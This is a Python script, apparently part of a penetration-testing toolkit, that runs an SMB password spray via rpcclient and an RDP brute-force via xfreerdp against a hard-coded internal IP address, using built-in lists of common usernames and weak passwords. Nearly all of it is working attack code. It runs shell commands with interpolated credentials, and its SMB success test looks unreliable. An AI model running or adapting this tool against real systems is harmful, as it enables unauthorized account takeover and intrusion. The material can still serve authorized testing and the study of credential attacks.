#!/usr/bin/env python3

import subprocess
import json
import os
from datetime import datetime

def run_command(command, timeout=300):
    """Run a system command and return results"""
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=timeout)
        return {
            'success': result.returncode == 0,
            'output': result.stdout,
            'error': result.stderr,
            'returncode': result.returncode
        }
    except subprocess.TimeoutExpired:
        return {'success': False, 'error': 'Command timed out', 'output': ''}
    except Exception as e:
        return {'success': False, 'error': str(e), 'output': ''}

def generate_username_list(target_ip):
    """Generate potential usernames based on target information"""
    print(f"[*] Generating username list for {target_ip}")
    
    # Basic username list
    usernames = [
        'administrator', 'admin', 'guest', 'user', 'test',
        'root', 'backup', 'web', 'www', 'sql', 'db', 'oracle',
        'ftp', 'ssh', 'rdp', 'support', 'helpdesk', 'service'
    ]
    
    # Add domain-specific usernames if we have info
    # You can enhance this with actual enumeration data later
    
    return usernames

def generate_password_list():
    """Generate common passwords for spraying"""
    print("[*] Generating password list")
    
    passwords = [
        '', 'password', 'Password123', 'P@ssw0rd', 'Welcome123',
        'Changeme123', 'admin', 'administrator', 'letmein', '123456',
        'qwerty', 'password1', 'Password1', 'Summer2023', 'Winter2023',
        'Company123', 'Default123', 'Secret123', 'Admin123'
    ]
    
    return passwords

def smb_password_spray(target_ip, usernames, passwords):
    """SMB password spraying attack"""
    print(f"[*] Starting SMB password spray against {target_ip}")
    
    results = {}
    
    for password in passwords:
        print(f"  Spraying password: '{password}'")
        password_results = {}
        
        for username in usernames:
            # Try each username with this password
            if password:  # With password
                cmd = f"echo '{password}' | rpcclient -U '{username}%{password}' {target_ip} -c 'getusername' 2>/dev/null"
            else:  # Empty password
                cmd = f"rpcclient -U '{username}' -N {target_ip} -c 'getusername' 2>/dev/null"
            
            result = run_command(cmd)
            password_results[username] = result
            
            # Check if authentication succeeded
            if result['success'] and 'NT_STATUS_OK' not in result.get('error', ''):
                print(f"    ✅ SUCCESS: {username}:{password}")
        
        results[password] = password_results
    
    return results

def rdp_brute_force(target_ip, usernames, passwords):
    """RDP brute force attack"""
    print(f"[*] Testing RDP access on {target_ip}")
    
    results = {}
    
    # First check if RDP is open
    rdp_check = run_command(f"nmap -p 3389 --open {target_ip}")
    if "3389/tcp open" not in rdp_check.get('output', ''):
        return {'status': 'RDP port not open', 'check': rdp_check}
    
    # Try each credential combination
    for username in usernames:
        for password in passwords:
            # Use xfreerdp for testing
            cmd = f"echo '{password}' | xfreerdp /v:{target_ip} /u:{username} /p:{password} /cert:ignore +auth-only /sec:nla 2>&1"
            result = run_command(cmd, timeout=30)
            
            results[f"{username}:{password}"] = result
            
            # Check for successful authentication
            if "Authentication only" in result.get('output', '') and "ERRCONNECT_LOGON_FAILURE" not in result.get('output', ''):
                print(f"    ✅ RDP SUCCESS: {username}:{password}")
    
    return results

def run_credential_attacks(target_ip):
    """Main function for credential attacks"""
    print(f"\n{'='*60}")
    print(f"CREDENTIAL ATTACK MODULE - Target: {target_ip}")
    print(f"{'='*60}")
    
    results = {
        'target': target_ip,
        'timestamp': datetime.now().isoformat(),
        'credential_attacks': {}
    }
    
    # Generate target lists
    usernames = generate_username_list(target_ip)
    passwords = generate_password_list()
    
    print(f"[*] Generated {len(usernames)} usernames and {len(passwords)} passwords")
    
    # Run credential attacks
    results['credential_attacks']['smb_spray'] = smb_password_spray(target_ip, usernames, passwords)
    results['credential_attacks']['rdp_attack'] = rdp_brute_force(target_ip, usernames, passwords)
    
    # Save results
    os.makedirs('results/credential_attacks', exist_ok=True)
    filename = f"results/credential_attacks/credential_attack_{target_ip}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    
    with open(filename, 'w') as f:
        json.dump(results, f, indent=4)
    
    print(f"[+] Credential attack results saved to {filename}")
    
    # Print summary
    print(f"\n{'='*40}")
    print("CREDENTIAL ATTACK SUMMARY")
    print(f"{'='*40}")
    
    successful_logins = 0
    for password, attempts in results['credential_attacks']['smb_spray'].items():
        for username, result in attempts.items():
            if result['success'] and 'NT_STATUS_OK' not in result.get('error', ''):
                successful_logins += 1
                print(f"✅ SMB Login: {username}:{password}")
    
    if successful_logins == 0:
        print("❌ No successful credential attacks")
    
    return results

if __name__ == "__main__":
    target = "10.0.3.20"
    results = run_credential_attacks(target)
    print(f"\nCredential attacks completed.")
